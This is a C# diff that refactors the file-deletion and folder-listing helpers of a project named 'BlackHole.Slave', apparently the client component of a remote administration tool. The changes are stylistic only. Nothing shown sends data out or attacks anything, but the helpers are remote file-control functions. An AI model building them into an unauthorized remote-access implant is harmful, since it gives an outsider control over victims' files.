@@ -29,13 +29,9 @@ namespace BlackHole.Slave.Helper
         public static FileDeletionMessage DeleteFile(string path)
         {
             path = Path.GetFullPath(path);
-
             File.Delete(path);
 
-            return new FileDeletionMessage()
-            {
-                FilePath = path
-            };
+            return new FileDeletionMessage { FilePath = path };
         }
 
         /// <summary>
@@ -47,12 +43,12 @@ namespace BlackHole.Slave.Helper
         {
             if (drives)
             {
-                return new FolderNavigationMessage()
+                return new FolderNavigationMessage
                 {
                     Path = path,
                     Files = DriveInfo.GetDrives()
                     .Where(drive => drive.IsReady)
-                    .Select(drive => new FileMeta()
+                    .Select(drive => new FileMeta
                     {
                         Type = FileType.FOLDER,
                         Name = drive.Name,
@@ -60,49 +56,47 @@ namespace BlackHole.Slave.Helper
                     }).ToList()
                 };
             }
-            else
-            {
-                // transform relative to absolute
-                path = Path.GetFullPath(path);
 
-                var files = new List<FileMeta>()
+            // transform relative to absolute
+            path = Path.GetFullPath(path);
+
+            var files = new List<FileMeta>
+            {
+                new FileMeta
                 {
-                    new FileMeta()
+                    Type = FileType.FOLDER,
+                    Name = "..",
+                    Size = "0"
+                }
+            };
+
+            // append directories
+            files.AddRange(
+                Directory.GetDirectories(path)
+                    .Select(name => new DirectoryInfo(name))
+                    .Select(info => new FileMeta
                     {
                         Type = FileType.FOLDER,
-                        Name = "..",
+                        Name = info.Name + "\\",
                         Size = "0"
-                    }
-                };
-                // append directories
-                files
-                    .AddRange(Directory
-                                    .GetDirectories(path)
-                                    .Select(name => new DirectoryInfo(name))
-                                    .Select(info => new FileMeta()
-                                    {
-                                        Type = FileType.FOLDER,
-                                        Name = info.Name + "\\",
-                                        Size = "0"
-                                    }));
-                // append files
-                files
-                    .AddRange(Directory
-                                    .GetFiles(path)
-                                    .Select(name => new FileInfo(name))
-                                    .Select(info => new FileMeta()
-                                    {
-                                        Type = FileType.FILE,
-                                        Name = info.Name,
-                                        Size = Utility.FormatFileSize(info.Length)
-                                    }));
+                    }));
 
-                return new FolderNavigationMessage()
-                {
-                    Path = path,
-                    Files = files
-                };
-            }
+            // append files
+            files.AddRange(
+                Directory.GetFiles(path)
+                    .Select(name => new FileInfo(name))
+                    .Select(info => new FileMeta
+                    {
+                        Type = FileType.FILE,
+                        Name = info.Name,
+                        Size = Utility.FormatFileSize(info.Length)
+                    }));
+
+            return new FolderNavigationMessage
+            {
+                Path = path,
+                Files = files
+            };
         }
     }
 }
